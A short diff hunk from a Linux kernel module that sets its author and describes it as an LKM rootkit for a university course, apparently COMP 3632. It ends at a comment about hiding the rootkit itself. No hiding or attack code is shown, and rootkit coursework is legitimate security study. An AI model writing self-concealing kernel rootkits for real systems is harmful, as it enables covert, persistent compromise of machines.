@@ -2,8 +2,8 @@
 #include <linux/module.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR(""); //
-MODULE_DESCRIPTION(""); //
+MODULE_AUTHOR("kytan");
+MODULE_DESCRIPTION("An LKM rootkit for COMP 3632");
 MODULE_VERSION("0.1");
 
 // Hide this LKM rootkit itself
